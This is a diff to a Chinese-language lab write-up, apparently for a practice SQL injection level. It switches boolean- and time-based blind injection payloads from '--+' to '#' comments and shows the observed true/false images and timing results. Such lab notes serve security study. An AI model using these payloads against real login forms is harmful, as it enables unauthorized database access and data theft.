@@ -6,6 +6,7 @@
 |---|---|
 | **注入类型** | POST · 盲注 |
 | **闭合方式** | `'` |
+| **注释符** | `# · POST 表单必须用它，--+ 会失效` |
 | **成败信号** | flag.jpg / slap.jpg |
 | **一句话** | 布尔 + 时间盲注 |
 | **核心 payload** | `uname=admin' and length(database())=8--+` |
@@ -28,15 +29,15 @@ else     { echo '<img src="../images/slap.jpg" />'; }
 
 **布尔盲注**
 ```
-uname = admin' --+                            →  flag.jpg
-uname = admin' and 1=2--+                     →  slap.jpg
-uname = admin' and length(database())=8--+    →  flag.jpg  （真）
-uname = admin' and length(database())=9--+    →  slap.jpg  （假）
+uname = admin'#                            →  flag.jpg
+uname = admin' and 1=2#                     →  slap.jpg
+uname = admin' and length(database())=8#    →  flag.jpg  （真）
+uname = admin' and length(database())=9#    →  slap.jpg  （假）
 ```
 
 **时间盲注**
 ```
-uname = admin' and sleep(3)--+   →  3280ms（正常 240ms）✓ 注入成功
+uname = admin' and sleep(3)#   →  3280ms（正常 240ms）✓ 注入成功
 ```
 
 ---
